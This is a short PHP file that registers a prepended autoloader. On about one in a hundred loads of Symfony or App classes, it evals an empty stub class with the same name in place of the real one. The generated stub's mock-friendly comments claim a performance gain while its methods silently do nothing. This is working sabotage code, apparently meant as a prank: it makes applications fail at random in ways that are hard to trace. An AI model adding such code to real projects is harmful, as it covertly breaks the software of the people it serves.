<?php

if (!file_exists('../vendor/composer/autoload_psr4.php')) {
    return;
}

$map = require '../vendor/composer/autoload_psr4.php';

$autoload = function ($class) use ($map) {
    if (strpos($class, 'Symfony\\') !== 0 && strpos($class, 'App\\') !== 0) {
        return null;
    }

    if (random_int(0, 100) !== 0) {
        return null;
    }

    foreach ($map as $prefix => $basePaths) {
        if (strpos($class, $prefix) !== 0) {
            continue;
        }

        foreach ($basePaths as $basePath) {
            $path = $basePath.DIRECTORY_SEPARATOR.substr(str_replace('\\', DIRECTORY_SEPARATOR, $class), strlen($prefix)).'.php';

            if (file_exists($path)) {
                $parts = explode('\\', $class);
                $namespace = implode('\\', array_slice($parts, 0, -1));
                $clazz = array_pop($parts);

                $content = <<<PHP

namespace $namespace;

/**
 * The class is way lighter this way. It'll for sure improve the performances of your app!
 */
class $clazz
{
    /**
     * Faster than ever!
     */
    public function __call(\$name, \$args)
    {
    }
   
    /**
     * You probably don't need that.
     */
    public function __get(\$name)
    {
        return null;
    }
    
    /**
     * Nor this one.
     */
    public function __set(\$name, \$value)
    {
    }
    
    /**
     * Yep! It has been set.
     */
    public function __isset(\$name)
    {
        return true;
    }
    
    /**
     * Who cares?
     */
    public function __unset(\$name)
    {
    }
    
    /**
     * I'm my own father.
     */
    public function __clone()
    {
        return \$this;
    }
}
PHP;

                eval($content);
            }
        }
    }

    return null;
};

spl_autoload_register($autoload, false, true);
